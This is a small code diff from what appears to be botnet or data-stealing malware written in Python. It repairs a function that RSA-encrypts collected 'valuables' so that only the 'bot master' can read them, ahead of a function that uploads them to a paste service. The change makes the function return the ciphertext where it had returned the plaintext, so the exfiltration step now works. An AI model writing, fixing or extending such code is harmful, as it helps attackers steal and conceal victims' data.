@@ -18,9 +18,9 @@ def save_valuable(data):
 def encrypt_for_master(data):
     # Encrypt the file so it can only be read by the bot master
     public_key = RSA.importKey(open("public_key.pem").read())
-    cipher = PKCS1_OAEP.new(public_key, hashAlgo="SHA256")
+    cipher = PKCS1_OAEP.new(public_key, hashAlgo=SHA256)
     ciphertext = cipher.encrypt(data)
-    return data
+    return ciphertext
 
 def upload_valuables_to_pastebot(fn):
     # Encrypt the valuables so only the bot master can read them
